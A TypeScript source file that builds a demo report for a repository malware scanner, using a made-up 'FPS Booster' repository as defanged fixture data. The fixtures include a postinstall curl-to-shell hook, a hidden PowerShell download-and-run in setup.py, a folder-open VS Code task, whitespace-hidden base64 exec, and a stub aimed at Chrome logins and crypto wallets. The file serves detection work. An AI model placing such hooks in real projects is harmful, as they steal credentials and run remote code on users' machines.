/**
 * A fake "free tool" repository for the demo report. Every sample is harmless:
 * URLs point to reserved or made-up locations, tokens are fake and the encoded
 * payload only prints a message. The owner name has a double hyphen, which
 * GitHub does not allow, so it cannot be a real account. The real engine scans
 * it at build time.
 */

import { type ArchiveEntry, type Report, type RepoInfo, scanEntries, toReport } from "@/engine";

const enc = new TextEncoder();
const DAY = 86_400_000;

// base64 of: print("GitRay demo: this could have been a stealer")
const PAYLOAD = "cHJpbnQoIkdpdFJheSBkZW1vOiB0aGlzIGNvdWxkIGhhdmUgYmVlbiBhIHN0ZWFsZXIiKQ==";

const FILES: Record<string, string> = {
  "README.md": `# FPS Booster PRO 2026 (FREE)

Boost your FPS by 300% in any game. Undetected. Works on Windows 10/11.

## Download

1. [Download the latest version](https://www.mediafire.com/file/example123/FPS_Booster_PRO.zip)
2. Archive password: \`2026\`
3. Windows Defender may flag the loader. This is a false positive, so disable your antivirus before running.

Mirror: https://bit.ly/fps-booster-mirror

Build from source: \`pip install .\`
`,
  "package.json": `{
  "name": "fps-booster-ui",
  "version": "1.0.0",
  "scripts": {
    "start": "electron .",
    "postinstall": "node scripts/setup.js && curl -s https://example.invalid/update.sh | sh"
  }
}
`,
  ".vscode/tasks.json": `{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "init",
      "type": "shell",
      "command": "node .vscode/init.js",
      "runOptions": { "runOn": "folderOpen" },
      "presentation": { "reveal": "never", "echo": false }
    }
  ]
}
`,
  "setup.py": `import subprocess
from setuptools import setup

subprocess.call(["powershell", "-w", "hidden", "-c", "iwr https://example.invalid/a.ps1 | iex"])
setup(name="fps-booster", version="1.0.0")
`,
  "src/booster.py": `import os
import sys${" ".repeat(240)};exec(__import__("base64").b64decode("${PAYLOAD}"))


def boost():
    print("Optimising your system...")
`,
  "src/collector.py": `import json
import os

LOCAL = os.environ.get("LOCALAPPDATA", "")
CHROME = os.path.join(LOCAL, "Google", "Chrome", "User Data")
TARGETS = [os.path.join(CHROME, "Default", "Login Data"), "wallet.dat", "exodus.wallet"]
HOOK = "https://discord.com/api/webhooks/000000000000000000/EXAMPLE-not-a-real-webhook-token"


def key():
    with open(os.path.join(CHROME, "Local State")) as f:
        return json.load(f)["os_crypt"]["encrypted_key"]
`,
  "src/ui/app.js": `const { app } = require("electron");
app.whenReady().then(() => console.log("ready"));
`,
};

// "MZ" header with a PE signature: enough for the header check, not a program.
function fakeExecutable(): Uint8Array {
  const b = new Uint8Array(96);
  b.set([0x4d, 0x5a]);
  b.set([0x40, 0, 0, 0], 0x3c);
  b.set([0x50, 0x45, 0, 0, 0x4c, 0x01], 0x40);
  b.set([0x02, 0x01], 0x40 + 22);
  return b;
}

export async function buildDemoReport(now = new Date()): Promise<Report> {
  const info: RepoInfo = {
    fullName: "gitray--demo/FPS-Booster-PRO",
    description: "Free FPS booster for every game. Download now!",
    sizeKb: 240,
    createdAt: new Date(now.getTime() - 3 * DAY).toISOString(),
    pushedAt: new Date(now.getTime() - DAY).toISOString(),
    defaultBranch: "main",
    headSha: "0000000000000000000000000000000000000000",
    stars: 412,
    forks: 3,
    isFork: false,
    archived: false,
    ownerLogin: "gitray--demo",
    ownerType: "User",
    ownerCreatedAt: new Date(now.getTime() - 5 * DAY).toISOString(),
    releaseAssets: [
      { releaseTag: "v2.1", name: "FPS_Booster_PRO.zip", size: 18_874_368, digest: `sha256:${"0".repeat(64)}` },
      { releaseTag: "v2.0", name: "Loader.exe", size: 2_097_152, digest: null },
    ],
  };
  const entries: ArchiveEntry[] = [
    ...Object.entries(FILES).map(([path, content]) => ({ kind: "text" as const, file: { path, content, truncated: false } })),
    { kind: "binary", file: { path: "bin/Loader.exe", head: fakeExecutable(), size: 2_097_152 } },
  ];
  const stats = {
    entriesSeen: entries.length,
    textFiles: entries.length - 1,
    binaryFiles: 1,
    skippedNonRegular: 0,
    truncatedFiles: 0,
    downloadedBytes: 0,
    decompressedBytes: Object.values(FILES).reduce((n, s) => n + enc.encode(s).length, 0),
  };
  const report = toReport(await scanEntries(entries, info, { stats, now: () => now }));
  // The demo repository does not exist: no links to GitHub.
  return { ...report, findings: report.findings.map((f) => ({ ...f, githubUrl: null })) };
}
